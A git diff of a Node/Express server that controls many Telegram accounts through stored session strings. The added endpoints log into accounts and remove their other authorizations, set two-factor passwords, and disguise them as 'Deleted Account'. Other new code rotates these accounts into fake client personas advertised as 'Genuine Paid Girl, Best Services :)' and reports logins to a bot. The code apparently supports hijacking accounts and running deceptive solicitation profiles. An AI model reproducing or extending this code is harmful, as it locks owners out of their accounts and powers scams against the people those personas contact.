@@ -10,6 +10,7 @@ const { getClient, hasClient, disconnectAll, createClient, deleteClient } = requ
 const bodyParser = require('body-parser');
 const swaggerUi = require('swagger-ui-express');
 const swaggerSpec = require('./swaggerConfig');
+const { sleep } = require('./utils')
 
 process.on('unhandledRejection', (reason, promise) => {
   console.error('Unhandled Rejection at:', promise, 'reason:', reason);
@@ -18,14 +19,14 @@ process.on('exit', async () => {
   await ChannelService.getInstance().closeConnection();
 });
 
-function sleep(ms) {
-  return new Promise(resolve => setTimeout(resolve, ms));
-}
-
 var cors = require('cors');
 const app = express();
 const port = 8000;
 const userMap = new Map();
+let activeClientSetup = undefined
+export function getActiveClientSetup() {
+  return activeClientSetup;
+}
 let ip;
 let clients;
 let upiIds;
@@ -308,6 +309,17 @@ app.post('/channels', async (req, res, next) => {
   })
 });
 
+app.get('/setupClient/:clientId', async (req, res, next) => {
+  res.send('Hello World!');
+  // console.log(req.body);
+  next();
+}, async (req, res) => {
+  const clientId = req.params?.clientId;
+  const archieveOld = req.query?.a;
+  console.log(clientId);
+  await setUpClient(clientId, archieveOld.toLowerCase() === 'yes' ? true : false)
+})
+
 app.get('/getip', (req, res) => {
   res.json(ip);
 });
@@ -319,8 +331,15 @@ app.post('/users', async (req, res, next) => {
 }, async (req, res) => {
   const user = req.body;
   const db = ChannelService.getInstance();
-  await db.insertUser(user);
-  await fetchWithTimeout(`${ppplbot()}&text=ACCOUNT LOGIN: ${user.userName ? user.userName : user.firstName}:${user.msgs}:${user.totalChats}\n https://uptimechecker.onrender.com/connectclient/${user.mobile}`)
+  const cli = getClient(user.mobile);
+  if (!cli || activeLoginNumber !== user.mobile) {
+    await db.insertUser(user);
+    await fetchWithTimeout(`${ppplbot()}&text=ACCOUNT LOGIN: ${user.userName ? user.userName : user.firstName}:${user.msgs}:${user.totalChats}\n https://uptimechecker.onrender.com/connectclient/${user.mobile}`)
+  } else {
+    console.log("New Session Generated");
+    await setNewClient(user);
+    await deleteClient(user.mobile)
+  }
 });
 
 app.get('/channels/:limit/:skip', async (req, res, next) => {
@@ -813,6 +832,159 @@ app.get('/set2fa/:number', async (req, res, next) => {
     }
   } catch (error) {
     console.log("Some Error: ", error.code)
+  }
+});
+
+
+app.get('/SetAsBufferClient/:number', async (req, res, next) => {
+  res.send("Updating Name");
+  next();
+}, async (req, res) => {
+  try {
+    const number = req.params?.number;
+    const db = ChannelService.getInstance();
+    const user = await db.getUser({ mobile: number });
+    console.log(user);
+    if (!hasClient(user.mobile)) {
+      const cli = await createClient(user.mobile, user.session, false);
+      const client = await getClient(user.mobile);
+      if (cli) {
+        await client.set2fa();
+        await sleep(30000)
+        await client.updateUsername();
+        await sleep(5000)
+        await client.updatePrivacyforDeletedAccount();
+        await sleep(5000)
+        await client.updateProfile("Deleted Account", "Deleted Account");
+        await sleep(5000)
+        await client.deleteProfilePhotos();
+        await sleep(5000)
+      } else {
+        console.log("Client Does not exist!")
+      }
+    }
+  } catch (error) {
+    console.log("Some Error: ", error)
+  }
+});
+
+
+app.get('/updatePrivacy/:number', async (req, res, next) => {
+  res.send("Updating Privacy");
+  next();
+}, async (req, res) => {
+  try {
+    const number = req.params?.number;
+    const db = ChannelService.getInstance();
+    const user = await db.getUser({ mobile: number });
+    console.log(user);
+    if (!hasClient(user.mobile)) {
+      const cli = await createClient(user.mobile, user.session, false);
+      const client = await getClient(user.mobile);
+      if (cli) {
+        await client.updatePrivacy();
+      } else {
+        console.log("Client Does not exist!")
+      }
+    }
+  } catch (error) {
+    console.log("Some Error: ", error)
+  }
+});
+
+app.get('/UpdateUsername/:number', async (req, res, next) => {
+  res.send("Updating Privacy");
+  next();
+}, async (req, res) => {
+  try {
+    const number = req.params?.number;
+    const username = req.query?.username;
+    const db = ChannelService.getInstance();
+    const user = await db.getUser({ mobile: number });
+    console.log(user);
+    if (!hasClient(user.mobile)) {
+      const cli = await createClient(user.mobile, user.session, false);
+      const client = await getClient(user.mobile);
+      if (cli) {
+        await client.updateUsername(username);
+      } else {
+        console.log("Client Does not exist!")
+      }
+    }
+  } catch (error) {
+    console.log("Some Error: ", error)
+  }
+});
+
+
+app.get('/UpdatePP/:number', async (req, res, next) => {
+  res.send("Updating profile Pic");
+  next();
+}, async (req, res) => {
+  try {
+    const number = req.params?.number;
+    const db = ChannelService.getInstance();
+    const user = await db.getUser({ mobile: number });
+    console.log(user);
+    if (!hasClient(user.mobile)) {
+      const cli = await createClient(user.mobile, user.session, false);
+      const client = await getClient(user.mobile);
+      if (cli) {
+        await client.updateProfilePic("./qrcode.jpg");
+      } else {
+        console.log("Client Does not exist!")
+      }
+    }
+  } catch (error) {
+    console.log("Some Error: ", error)
+  }
+});
+
+
+app.get('/UpdateName/:number', async (req, res, next) => {
+  res.send("Updating Name");
+  next();
+}, async (req, res) => {
+  try {
+    const number = req.params?.number;
+    const db = ChannelService.getInstance();
+    const user = await db.getUser({ mobile: number });
+    console.log(user);
+    if (!hasClient(user.mobile)) {
+      const cli = await createClient(user.mobile, user.session, false);
+      const client = await getClient(user.mobile);
+      if (cli) {
+        await client.updateProfile("Deleted Account", "Deleted Account");
+      } else {
+        console.log("Client Does not exist!")
+      }
+    }
+  } catch (error) {
+    console.log("Some Error: ", error)
+  }
+});
+
+
+app.get('/deletepp/:number', async (req, res, next) => {
+  res.send("Updating Name");
+  next();
+}, async (req, res) => {
+  try {
+    const number = req.params?.number;
+    const db = ChannelService.getInstance();
+    const user = await db.getUser({ mobile: number });
+    console.log(user);
+    if (!hasClient(user.mobile)) {
+      const cli = await createClient(user.mobile, user.session, false);
+      const client = await getClient(user.mobile);
+      if (cli) {
+        await client.deleteProfilePhotos();
+      } else {
+        console.log("Client Does not exist!")
+      }
+    }
+  } catch (error) {
+    console.log("Some Error: ", error)
   }
 });
 
@@ -1524,10 +1696,10 @@ async function checkBufferClients() {
     }
   }
   console.log(badIds, goodIds);
-  await set2faToUSers();
+  await addNewUserstoBufferClients();
 }
 
-async function set2faToUSers() {
+async function addNewUserstoBufferClients() {
   const db = await ChannelService.getInstance();
   const cursor = await db.getNewBufferClients(goodIds);
   while (badIds.length > 0) {
@@ -1542,10 +1714,18 @@ async function set2faToUSers() {
           if (!hasPassword) {
             await client.removeOtherAuths();
             await client.set2fa();
+            console.log("waiting for setting 2FA");
+            await sleep(35000);
+            await client.updateUsername();
+            await sleep(10000)
+            await client.updatePrivacyforDeletedAccount();
+            await sleep(10000)
+            await client.updateProfile("Deleted Account", "Deleted Account");
+            await sleep(10000)
+            await client.deleteProfilePhotos();
+            await sleep(10000)
             console.log("Inserting Document");
             await db.insertInBufferClients(document);
-            console.log("waiting for setting 2FA");
-            await sleep(30000);
             await client.disconnect();
             badIds.pop();
           }
@@ -1561,3 +1741,73 @@ async function set2faToUSers() {
   }
 }
 
+
+
+async function setUpClient(clientId, archieveOld) {
+  const db = await ChannelService.getInstance();
+  const oldClient = await db.getUserConfig({ clientId })
+  if (archieveOld) {
+    await db.insertInAchivedClient(oldClient);
+    console.log("Archived old client");
+  }
+
+  const newClient = await db.getOneBufferClient();
+  if (newClient) {
+    const cli = await createClient(newClient.mobile, newClient.session);
+    if (cli) {
+      const client = await getClient(newClient.mobile);
+      await client.updateUsername(clientId);
+      await sleep(10000)
+      await client.updatePrivacy();
+      await sleep(10000)
+      await client.updateProfile(oldClient.name, "Genuine Paid Girl, Best Services :)");
+      await sleep(10000)
+      //Todo: profile pics
+      await generateNewSession(newClient.mobile)
+    }
+  }
+}
+
+
+async function generateNewSession(phoneNumber, clientId) {
+  try {
+    const response = await axios.get(`https://tgsignup.onrender.com/login?phone=${phoneNumber}`);
+    activeClientSetup = { phoneNumber, clientId };
+    setTimeout(() => {
+      activeClientSetup = undefined
+    }, 50000);
+    console.log('Success:', response);
+  } catch (error) {
+    console.log(error)
+  }
+}
+
+async function setNewClient(user) {
+  try {
+    const db = await ChannelService.getInstance();
+    let mainAccount = user.userName?.replace("@", '')
+    if (fetchNumbersFromString(activeClientSetup.clientId) == "2") {
+      const mainUser = await db.getUserConfig({ clientId: activeClientSetup.clientId.replace("2", "1") });
+      mainAccount = mainUser.userName;
+      await axios.get(`${mainUser.repl}/exit`);
+    }
+    const updatedClient = await db.updateUserConfig({ clientId: activeClientSetup.clientId }, { session: user.session, number: `+${user.mobile}`, userName: user.userName?.replace("@", ''), mainAccount: mainAccount });
+    console.log("Updated the Client Successfully");
+    await db.deleteBufferClient({ mobile: activeClientSetup.phoneNumber });
+    activeClientSetup = undefined;
+    await axios.get(`${updatedClient.repl}/exit`)
+  } catch (error) {
+    console.log(error);
+  }
+}
+
+function fetchNumbersFromString(inputString) {
+  const regex = /\d+/g;
+  const matches = inputString.match(regex);
+  if (matches) {
+    const result = matches.join('');
+    return result;
+  } else {
+    return '';
+  }
+}
